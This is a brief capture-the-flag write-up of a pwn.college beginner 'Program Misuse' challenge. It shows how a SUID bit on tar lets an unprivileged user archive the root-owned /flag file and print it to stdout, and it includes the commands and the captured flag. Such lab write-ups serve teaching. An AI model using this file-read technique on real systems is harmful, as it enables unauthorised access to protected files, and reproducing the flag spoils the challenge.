---
layout: page
title: "Challenge Name: tar"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/tar`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/tar
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/tar
```

-The `s` in `-rws` indicates it's a SUID binary.
-`tar` runs with **root privileges**.

## 🚀 Exploitation

The `tar` command (short for "tape archive") is used to create, extract, and manage archives, usually with a .tar, .tar.gz, or .tar.bz2 extension.

But along -c(create archieve) , -x(extract archieve) , one option -O can be usedto output the content to stdout instead of disk.

With this method we can easily reveal the flag, Let's se how? :


```bash
cd /
tar -cf myflag.tar flag
tar -xf myflag.tar flag -O
```

With the help of -O , now the content of flag is in stdout and will be printed on terminal.

Output:
```
pwn.college{I4RQuEF2wMGOlHLlE24SUf4hf91.dJjNxwSM0IzMyEzW}
```

      
